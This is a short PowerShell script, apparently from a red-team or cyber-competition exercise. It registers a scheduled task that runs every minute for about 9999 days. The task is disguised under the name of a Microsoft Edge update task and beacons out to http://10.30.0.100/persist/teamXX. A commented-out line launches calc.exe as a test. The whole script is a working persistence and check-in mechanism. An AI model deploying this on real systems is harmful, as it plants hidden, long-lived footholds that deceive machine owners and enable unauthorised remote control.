# runs task every min & runs immedatly after registration (still takes a min for it to check in)
#$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-NoProfile -Command `calc.exe`""
$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-NoProfile -Command `Invoke-WebRequest -Uri http://10.30.0.100/persist/teamXX`""

$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 9999)

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCoreUA" -Description "Runs a command every minute starting immediately"